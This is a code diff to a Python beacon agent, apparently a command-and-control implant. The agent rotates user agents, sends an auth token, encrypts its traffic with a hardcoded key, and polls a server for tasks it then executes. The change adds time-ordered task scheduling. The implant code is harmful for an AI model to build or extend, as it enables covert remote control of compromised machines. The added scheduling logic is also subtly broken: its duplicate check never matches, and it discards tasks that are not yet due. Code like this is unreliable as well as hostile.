@@ -11,7 +11,7 @@ import platform
 from cryptography.fernet import Fernet
 import importlib.util
 from multiprocessing import Process
-from datetime import datetime
+from datetime import datetime ,timezone
 
 
 SERVER_URL = "http://localhost:5000"
@@ -39,6 +39,8 @@ USER_AGENTS = [
 
 SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
 cipher = Fernet(SECRET_KEY)
+
+scheduled_tasks = []
 
 
 def encrypt_data(data):
@@ -95,9 +97,6 @@ def login():
         print("Login exception:", e)
         return False
 
-
-
-
 def beacon():
 
     headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
@@ -115,14 +114,31 @@ def beacon():
         )
 
         if response.status_code == 200:
-
             data = response.json()
+            # iterates through tasks offered by beacon , Avoids adding same task by filtering through UUID
+            for item in data:
+                if item["uuid"] not in scheduled_tasks:
+                    scheduled_tasks.append(item)
+            # Sorts the tasks by scheduled exec time in an ascending matter
+            scheduled_tasks.sort(key=lambda x: x['scheduled_at'], reverse=False)
+            print("sched: ", scheduled_tasks)
+            # pops first task supposed to be executed
+            task_to_run = scheduled_tasks.pop(0)
+            print(task_to_run)
 
-            task = data.get("task")
-            task_uuid = data.get("uuid")
+            task = task_to_run["task"]
+            task_uuid = task_to_run["uuid"]
+            scheduled_at = task_to_run["scheduled_at"]
+            scheduled_at_cmp = datetime.fromisoformat(scheduled_at)
 
-            if task and task_uuid:
-                execute_task(task, task_uuid)
+            current_time = datetime.now(timezone.utc)
+
+            if scheduled_at_cmp <=current_time:
+                if task and task_uuid:
+                    execute_task(task, task_uuid)
+
+            else:
+                print("No tasks to run")
 
     except Exception as e:
         print(f"[!] Beacon error: {e}")
@@ -326,8 +342,6 @@ def main():
         sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
         print(f"[+] Sleeping {sleep_time} seconds")
         time.sleep(sleep_time)
-
-
 
 if __name__ == "__main__":
     main()
